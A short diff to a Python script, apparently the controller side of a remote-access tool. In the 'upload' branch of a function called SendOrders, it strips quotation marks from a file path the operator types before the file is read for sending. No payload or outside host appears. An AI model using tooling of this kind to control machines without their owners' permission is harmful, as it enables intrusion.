@@ -93,12 +93,15 @@ def SendOrders(Con):
                 print(" - Error 1 , Something Is Wrong")
                 continue
 
+
         elif(Command == 'upload'):
         	
             try:
                     
                 try:
                     Up = input(" - File Path -> ")
+                    Up = Up.replace('"',"")
+
                     with open(Up, "rb") as F:
                         Data = F.read() # Read File Bytes
                 except:
